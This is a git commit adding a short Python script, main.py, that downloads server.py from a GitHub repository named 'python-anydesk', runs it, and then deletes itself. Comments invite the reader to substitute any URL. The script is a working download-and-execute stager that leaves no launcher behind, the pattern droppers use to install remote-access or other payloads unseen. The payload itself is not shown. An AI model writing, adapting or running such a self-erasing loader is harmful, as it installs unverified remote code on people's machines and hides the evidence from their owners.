d2feca5e652c0cf9039f0856d873536d4b3bd1a9
Rishi Rao <61234147+DeveloperRishi@users.noreply.github.com>
2024-05-28 11:06:46 +0530

    Add files via upload

---
+++ main.py
@@ -0,0 +1,27 @@
+import os
+import requests
+import subprocess
+
+def download_file(url, file_name):
+    with open(file_name, "wb") as f:
+        response = requests.get(url)
+        f.write(response.content)
+
+def run_file(file_name):
+    try:
+        subprocess.run(['python', file_name], check=True)
+    except subprocess.CalledProcessError as e:
+        print(f"Error running {file_name}: {e}")
+
+def main():
+    url = "https://raw.githubusercontent.com/developerrishi/python-anydesk/main/server.py" # Replace it with your file
+    file_name = "server.py" # Name it according to you
+
+    download_file(url, file_name)
+    run_file(file_name)
+
+    # Clean up: Delete itself after running
+    os.remove("main.py") # Replace it with this file name
+
+if __name__ == "__main__":
+    main()
